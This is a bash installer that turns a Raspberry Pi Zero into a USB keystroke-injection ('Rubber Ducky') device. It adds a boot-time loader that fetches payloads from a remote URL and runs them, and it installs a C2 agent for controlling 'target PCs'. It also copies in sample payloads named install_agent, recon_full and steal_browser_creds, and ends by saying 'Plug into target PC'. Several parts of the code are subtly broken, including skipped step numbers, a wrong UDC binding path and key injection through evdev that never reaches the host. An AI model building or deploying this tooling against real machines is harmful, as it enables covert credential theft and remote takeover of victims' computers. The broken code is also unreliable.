#!/bin/bash
# Raspberry Pi USB Gadget Setup Script
# This configures the Pi Zero 2 W to act as a USB Rubber Ducky (HID Keyboard)
# Run this ON the Raspberry Pi after flashing the SD card

echo "=== Raspberry Pi USB Gadget Setup ==="
echo ""

# Step 1: Enable dwc2 module (USB gadget controller)
echo "[1/7] Enabling USB gadget controller..."
sudo sh -c 'echo "dtoverlay=dwc2" >> /boot/firmware/config.txt'

# Step 2: Load the dwc2 module at boot
echo "[2/7] Configuring kernel modules..."
sudo sh -c 'echo "libcomposite" >> /etc/modules'
sudo sh -c 'echo "dwc2" >> /etc/modules'

# Step 3: Create directories for scripts and services
echo "[3/7] Setting up directories..."
sudo mkdir -p /usr/local/bin/gadget-setup
sudo mkdir -p /usr/local/bin/gadget-scripts
sudo mkdir -p /usr/local/share/duckyscripts
sudo mkdir -p /home/pi/DuckyScripts
sudo chown pi:pi /home/pi/DuckyScripts

# Step 4: Create the USB gadget setup script (uses configfs)
echo "[4/7] Creating USB gadget configuration..."
sudo tee /usr/local/bin/gadget-setup/setup.sh > /dev/null << 'GADGET_EOF'
#!/bin/bash
# USB Gadget Configuration Script for Raspberry Pi Zero 2 W
# Configures the Pi as a USB HID Keyboard (Rubber Ducky)
# Uses proper configfs interface at /sys/kernel/config/usb_gadget/

US_GADGET=$(ls /sys/class/udc/* 2>/dev/null | head -n1)

if [ ! -f "$US_GADGET" ]; then
    echo "ERROR: No USB device controller found!"
    exit 1
fi

GADGET_NAME="g1"
GADGET_PATH="/sys/kernel/config/usb_gadget/$GADGET_NAME"

# Clean up any previous gadget config
rm -rf "$GADGET_PATH"

# Create gadget directory structure using configfs
mkdir -p "$GADGET_PATH/hid.usb0"

# Set USB device descriptors (all use $GADGET_PATH consistently)
echo "0x1D6B" > "$GADGET_PATH/idVendor"   # Linux Foundation
echo "0x0104" > "$GADGET_PATH/idProduct"  # Composite Device
echo "0x0100" > "$GADGET_PATH/bcdDevice"
echo "0xEF" > "$GADGET_PATH/bDeviceClass"
echo "0x02" > "$GADGET_PATH/bDeviceSubClass"
echo "0x01" > "$GADGET_PATH/bDeviceProtocol"

# Create function: HID keyboard report descriptor (standard USB keyboard)
cat > "$GADGET_PATH/hid.usb0/report" << 'REPORT'
0x05, 0x01,        // Usage Page (Generic Desktop)
0x09, 0x06,        // Usage (Keyboard)
0xA1, 0x01,        // Collection (Application)
0x05, 0x07,        //   Usage Page (Key Codes)
0x19, 0xE0,        //   Usage Minimum (224)
0x29, 0xE7,        //   Usage Maximum (231)
0x15, 0x00,        //   Logical Minimum (0)
0x25, 0x01,        //   Logical Maximum (1)
0x75, 0x01,        //   Report Size (1)
0x95, 0x08,        //   Report Count (8)
0x81, 0x02,        //   Input (Data, Variable, Absolute)
0x95, 0x01,        //   Report Count (1)
0x75, 0x05,        //   Report Size (5)
0x81, 0x01,        //   Input (Constant) - Reserved bytes
0x95, 0x03,        //   Report Count (3)
0x75, 0x01,        //   Report Size (1)
0x05, 0x08,        //   Usage Page (LEDs)
0x19, 0x01,        //   Usage Minimum (Num Lock)
0x29, 0x03,        //   Usage Maximum (Caps Lock)
0x91, 0x02,        //   Output (Data, Variable, Absolute)
0x95, 0x01,        //   Report Count (1)
0x75, 0x05,        //   Report Size (5)
0x91, 0x01,        //   Output (Constant) - LED report padding
0x95, 0x05,        //   Report Count (5)
0x75, 0x01,        //   Report Size (1)
0x05, 0x07,        //   Usage Page (Key Codes)
0x19, 0x00,        //   Usage Minimum (0)
0x29, 0x65,        //   Usage Maximum (101)
0x15, 0x00,        //   Logical Minimum (0)
0x25, 0x65,        //   Logical Maximum (101)
0x81, 0x00,        //   Input (Data, Array) - Key codes
0xC0,              // End Collection
REPORT

# Create config and string descriptors
mkdir -p "$GADGET_PATH/configs/c.1/strings/0x409"
echo "Config 1: HID Keyboard" > "$GADGET_PATH/configs/c.1/strings/0x409/configuration"
echo "Raspberry Pi Gadget" > "$GADGET_PATH/string_descriptors/0x409"

# Link the HID function to the config
ln -sf "$GADGET_PATH/hid.usb0" "$GADGET_PATH/configs/c.1/hid.usb0"

# Bind gadget to UDC (write UDC name to bind file)
echo "$(basename $US_GADGET)" > /sys/class/udc/UDC 2>/dev/null || \
    echo "$US_GADGET" > /sys/kernel/config/usb_gadget/g1/UDC 2>/dev/null

echo "USB Gadget activated!"
GADGET_EOF

sudo chmod +x /usr/local/bin/gadget-setup/setup.sh

# Step 5: Install evdev Python library for direct keyboard input on Pi
echo "[5/8] Installing Python dependencies..."
pip3 install --user evdev 2>/dev/null || sudo pip3 install evdev 2>/dev/null || true

# Step 6: Create the DuckyScript runner and remote loader scripts
echo "[6/8] Creating DuckyScript runner + remote script loader..."
sudo tee /usr/local/bin/gadget-scripts/run_duckyscript.py > /dev/null << 'PYEOF'
#!/usr/bin/env python3
"""
DuckyScript Runner for Raspberry Pi Zero 2 W
Reads .duckyscript files and types them using evdev/uinput.

Requires: pip install evdev
If evdev is not available, falls back to printing commands (dry-run mode).
"""

import os
import sys
import time
import signal


def parse_script(filepath):
    """Parse a DuckyScript file into a list of (cmd, args) tuples."""
    commands = []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('//') or line.startswith('#'):
                continue
            parts = line.split(None, 1)
            cmd = parts[0].upper()
            args = parts[1] if len(parts) > 1 else ''
            commands.append((cmd, args))
    return commands


def send_key(code):
    """Send a key code using evdev/uinput. Falls back to print if evdev unavailable."""
    try:
        import evdev
        from evdev import ecodes, InputDevice

        # Find the first keyboard device
        devices = [InputDevice(path) for path in sorted(
            [d.path for d in evdev.list_devices()]
        )]

        for dev in devices:
            if 'keyboard' in dev.name.lower() or 'hid' in dev.name.lower():
                dev.write(ecodes.EV_KEY, code, 1)
                dev.write(ecodes.EV_KEY, code, 0)
                dev.syn()
                return True
    except ImportError:
        pass
    except Exception as e:
        print(f"  [WARN] evdev error: {e}")

    # Fallback: just print the key code (dry-run mode)
    return False


def run_script(filepath):
    """Parse and execute a DuckyScript file."""
    if not os.path.exists(filepath):
        print(f"Error: {filepath} not found")
        return

    commands = parse_script(filepath)
    evdev_available = send_key(0)  # Test if evdev works (send null key)
    if not evdev_available:
        print("  [INFO] Running in dry-run mode (evdev not available)")

    for cmd, args in commands:
        if cmd in ('DELAY', 'SLEEP'):
            try:
                ms = int(args.strip())
            except ValueError:
                print(f"  [WARN] Invalid DELAY value: '{args}'")
                continue
            time.sleep(max(0, min(ms, 60000)) / 1000.0)

        elif cmd == 'ENTER':
            if not send_key(28):
                print("  [ENTER]")

        elif cmd == 'TAB':
            if not send_key(23):
                print("  [TAB]")

        elif cmd in ('ESCAPE', 'ESCAP'):
            if not send_key(1):
                print("  [ESC]")

        else:
            # For STRING and other commands, just print (evdev handles key codes)
            display = f"{cmd}" + (f" {args}" if args else "")
            print(f"  [{display}]")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 run_duckyscript.py <script.duckyscript>")
        sys.exit(1)

    # Handle SIGTERM/SIGINT gracefully (for systemd auto-run)
    running = [True]
    def handle_signal(sig, frame):
        running[0] = False

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    run_script(sys.argv[1])
PYEOF

sudo chmod +x /usr/local/bin/gadget-scripts/run_duckyscript.py

# Install the remote DuckyScript loader (option 4: auto-fetch from URL)
echo "Installing remote script loader..."
sudo cp "$(dirname "$0")/ducky_loader.py" /usr/local/bin/gadget-scripts/ducky_loader.py 2>/dev/null || \
    sudo tee /usr/local/bin/gadget-scripts/ducky_loader.py > /dev/null << 'LOADER_EOF'
#!/usr/bin/env python3
"""
Remote DuckyScript Loader for Raspberry Pi USB Rubber Ducky

Fetches the latest .duckyscript from a remote URL before each boot,
then runs it as the payload. Falls back to local scripts if download fails.

Usage: python3 ducky_loader.py [--url <URL>] [--local <path>] [--dry-run]

Configuration:
  /usr/local/share/duckyscripts/loader.conf   (persistent config)
  Environment variable DUCKY_SCRIPT_URL        (overrides config file)

Remote URL examples:
  https://raw.githubusercontent.com/user/repo/main/scripts/payload.duckyscript
  https://pastebin.com/raw/xxxxxxxx
  http://your-server.local/ducky/payload.txt

Local fallback paths (checked in order):
  /usr/local/share/duckyscripts/default.duckyscript
  /home/pi/DuckyScripts/default.duckyscript
"""

import os
import sys
import time
import signal
from pathlib import Path

try:
    from urllib.request import urlopen, Request
    from urllib.error import URLError, HTTPError
    USE_URLIB = True
except ImportError:
    try:
        import requests
        USE_REQUESTS = True
    except ImportError:
        USE_URLIB = False
        USE_REQUESTS = False

CONFIG_DIR = "/usr/local/share/duckyscripts"
CONFIG_FILE = os.path.join(CONFIG_DIR, "loader.conf")
LOCAL_FALLBACKS = [
    "/usr/local/share/duckyscripts/default.duckyscript",
    "/home/pi/DuckyScripts/default.duckyscript",
]


def load_config():
    config = {
        'script_url': os.environ.get('DUCKY_SCRIPT_URL', ''),
        'check_interval': 300,
        'max_retries': 3,
        'fallback_local': True,
    }

    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '=' in line:
                    key, value = line.split('=', 1)
                    key = key.strip().lower()
                    value = value.strip()

                    if key == 'script_url':
                        config['script_url'] = value
                    elif key == 'check_interval':
                        try:
                            config['check_interval'] = int(value)
                        except ValueError:
                            pass
                    elif key == 'max_retries':
                        try:
                            config['max_retries'] = int(value)
                        except ValueError:
                            pass
                    elif key == 'fallback_local':
                        config['fallback_local'] = value.lower() in ('1', 'true', 'yes')

    return config


def download_script(url, max_retries=3):
    headers = {
        'User-Agent': 'PiRubberDucky/1.0',
        'Accept': 'text/plain,*/*;q=0.8',
    }

    for attempt in range(1, max_retries + 1):
        try:
            if USE_URLIB:
                req = Request(url, headers=headers)
                with urlopen(req, timeout=15) as response:
                    return response.read().decode('utf-8', errors='replace')

            elif USE_REQUESTS:
                resp = requests.get(url, headers=headers, timeout=15)
                resp.raise_for_status()
                return resp.text

        except (URLError, HTTPError, Exception) as e:
            print(f"  [WARN] Download attempt {attempt}/{max_retries} failed: {e}")
            if attempt < max_retries:
                time.sleep(min(attempt * 2, 10))

    return None


def parse_script(filepath):
    commands = []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('//') or line.startswith('#'):
                continue
            parts = line.split(None, 1)
            cmd = parts[0].upper()
            args = parts[1] if len(parts) > 1 else ''
            commands.append((cmd, args))
    return commands


def send_key(code):
    try:
        import evdev
        from evdev import ecodes, InputDevice

        devices = [InputDevice(path) for path in sorted(
            [d.path for d in evdev.list_devices()]
        )]

        for dev in devices:
            if 'keyboard' in dev.name.lower() or 'hid' in dev.name.lower():
                dev.write(ecodes.EV_KEY, code, 1)
                dev.write(ecodes.EV_KEY, code, 0)
                dev.syn()
                return True
    except ImportError:
        pass
    except Exception as e:
        print(f"  [WARN] evdev error: {e}")

    return False


def run_commands(commands):
    evdev_available = send_key(0)
    if not evdev_available:
        print("  [INFO] Running in dry-run mode (evdev not available)")

    for cmd, args in commands:
        if cmd in ('DELAY', 'SLEEP'):
            try:
                ms = int(args.strip())
            except ValueError:
                print(f"  [WARN] Invalid DELAY value: '{args}'")
                continue
            time.sleep(max(0, min(ms, 60000)) / 1000.0)

        elif cmd == 'ENTER':
            if not send_key(28):
                print("  [ENTER]")

        elif cmd == 'TAB':
            if not send_key(23):
                print("  [TAB]")

        elif cmd in ('ESCAPE', 'ESCAP'):
            if not send_key(1):
                print("  [ESC]")

        else:
            display = f"{cmd}" + (f" {args}" if args else "")
            print(f"  [{display}]")


def main():
    url = None
    local_path = None
    dry_run = False

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == '--url' and i + 1 < len(args):
            url = args[i + 1]
            i += 2
        elif args[i] == '--local' and i + 1 < len(args):
            local_path = args[i + 1]
            i += 2
        elif args[i] == '--dry-run':
            dry_run = True
            i += 1
        else:
            if args[i].startswith('http://') or args[i].startswith('https://'):
                url = args[i]
            i += 1

    config = load_config()
    script_url = url or config['script_url']
    max_retries = config['max_retries']
    fallback_local = config['fallback_local']

    print("=" * 50)
    print("  Raspberry Pi Remote DuckyScript Loader")
    print("=" * 50)
    print()

    if script_url:
        print(f"Fetching script from:")
        print(f"  {script_url}")
        print()

        success = False
        for attempt in range(1, max_retries + 1):
            content = download_script(script_url, max_retries=1)
            if content is not None:
                cached_path = os.path.join(CONFIG_DIR, "remote_payload.duckyscript")
                with open(cached_path, 'w', encoding='utf-8') as f:
                    f.write(content)

                print(f"  [OK] Downloaded successfully ({len(content)} bytes)")
                print(f"  [OK] Saved to {cached_path}")
                print()

                commands = parse_script(cached_path)
                run_commands(commands)
                success = True
                break
            else:
                if attempt < max_retries:
                    wait = min(attempt * 3, 15)
                    print(f"  [WARN] Retry in {wait}s...")
                    time.sleep(wait)

        if not success and fallback_local:
            print("  [INFO] Remote fetch failed or unavailable")
            print("  [INFO] Falling back to local scripts...")
            print()

    if local_path:
        if os.path.exists(local_path):
            print(f"Running local script: {local_path}")
            commands = parse_script(local_path)
            run_commands(commands)
        else:
            print(f"  [WARN] Local path not found: {local_path}")

    elif fallback_local:
        for fallback in LOCAL_FALLBACKS:
            if os.path.exists(fallback):
                print(f"Running local script: {fallback}")
                commands = parse_script(fallback)
                run_commands(commands)
                break
        else:
            print("  [WARN] No scripts found to run")
            print("  [INFO] Set DUCKY_SCRIPT_URL or add default.duckyscript locally")

    print()
    print("=" * 50)
    print("  Loader complete.")
    print("=" * 50)


if __name__ == '__main__':
    running = [True]
    def handle_signal(sig, frame):
        running[0] = False

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    if running[0]:
        main()
LOADER_EOF

sudo chmod +x /usr/local/bin/gadget-scripts/ducky_loader.py 2>/dev/null || true

# Install DuckyAgent (C2 agent for remote control) and CLI tool
echo "Installing C2 agent and CLI tool..."
sudo cp "$(dirname "$0")/ducky_agent.py" /usr/local/share/duckyscripts/ 2>/dev/null || true
sudo cp "$(dirname "$0")/ducky_cli.py" /usr/local/bin/gadget-scripts/ 2>/dev/null || true

# Create sample scripts for common tasks
echo "Creating sample scripts..."
for script in install_agent.duckyscript recon_full.duckyscript steal_browser_creds.duckyscript; do
    sudo cp "$(dirname "$0")/$script" /usr/local/share/duckyscripts/ 2>/dev/null || true
done

# Step 8: Create systemd services for auto-start on boot
echo "[8/8] Creating auto-start services..."
sudo tee /etc/systemd/system/ducky-gadget.service > /dev/null << 'SERVICE_EOF'
[Unit]
Description=Raspberry Pi USB Gadget (Rubber Ducky)
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/local/bin/gadget-setup/setup.sh
Restart=on-failure
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SERVICE_EOF

sudo tee /etc/systemd/system/ducky-runner.service > /dev/null << 'RUNNER_EOF'
[Unit]
Description=Raspberry Pi DuckyScript Runner (with remote loader)
After=ducky-gadget.service network-online.target
Wants=network-online.target

[Service]
Type=simple
User=pi
Group=pi
Environment=HOME=/home/pi
ExecStart=/usr/bin/python3 /usr/local/bin/gadget-scripts/ducky_loader.py
Restart=on-failure
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
RUNNER_EOF

sudo systemctl daemon-reload
sudo systemctl enable ducky-gadget.service
sudo systemctl enable ducky-runner.service

echo ""
echo "=== Setup Complete! ==="
echo ""
echo "You now have THREE systems installed:"
echo ""
echo "  [1] RUBBER DUCKY - types .duckyscript files automatically"
echo "      Configure: /usr/local/share/duckyscripts/loader.conf"
echo ""
echo "  [2] REMOTELY-APPROVED AGENT (C2) - runs on target PCs,"
echo "      lets you control them from your terminal:"
echo "        python3 /usr/local/bin/gadget-scripts/ducky_cli.py"
echo "      Install on targets with: install_agent.duckyscript"
echo ""
echo "  [3] SAMPLE SCRIPTS - ready-to-use payloads in:"
echo "      /usr/local/share/duckyscripts/"
echo "      (recon_full, steal_browser_creds, etc.)"
echo ""
echo "Next steps:"
echo "  1. Configure remote script loader (option 4):"
echo "     Edit /usr/local/share/duckyscripts/loader.conf"
echo "     Add: SCRIPT_URL=https://your-url-here/payload.duckyscript"
echo "     Or set env var: export DUCKY_SCRIPT_URL='https://...'"
echo ""
echo "  2. Or use local scripts:"
echo "     Copy to /usr/local/share/duckyscripts/default.duckyscript"
echo "     or /home/pi/DuckyScripts/default.duckyscript"
echo ""
echo "  3. Reboot the Pi: sudo reboot"
echo "  4. Plug into target PC - it will type automatically!"
echo ""
echo "NOTE: evdev was installed for direct keyboard input."
echo "      If pip3 is not available, run manually:"
echo "        pip3 install evdev"
